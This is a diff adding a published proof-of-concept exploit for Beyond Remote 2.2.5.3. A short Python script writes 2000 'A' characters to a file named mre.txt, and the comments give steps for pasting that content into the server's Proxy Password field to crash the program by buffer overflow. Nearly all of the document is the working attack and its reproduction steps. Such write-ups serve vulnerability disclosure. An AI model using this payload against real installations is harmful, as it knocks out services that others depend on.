@@ -1,0 +1,27 @@
+# Exploit Title: Beyond Remote 2.2.5.3 - Denial of Service (PoC)
+# Author: Erenay Gencay
+# Discovey Date: 2018-09-24
+# Vendor notified : 2018-09-24
+# Software Link: https://beyond-remote-client-and-server.jaleco.com/
+# Tested Version: 2.2.5.3
+# Tested on OS: Windows XP Professional sp3 (ENG)
+
+# Steps to Reproduce: Run the python exploit script, it will create a new file
+# file with the name "mre.txt". Copy the content of the new file "mre.txt".
+# Start Beyond Remote Server 2.2.5.3 and click "Configure" than click "Update Options" than 
+# click "Proxy Settings" Paste the content into field "Proxy Password" click "OK"
+# It will cause the DOS situation.
+
+bof = "A" * 2000
+
+try:
+
+	print("payload is loading..")
+	
+	dosya = open('mre.txt','w')
+	dosya.write(bof)
+	dosya.close()
+	print(" [+] File Created")
+
+except:
+	print("Someting went wrong !")
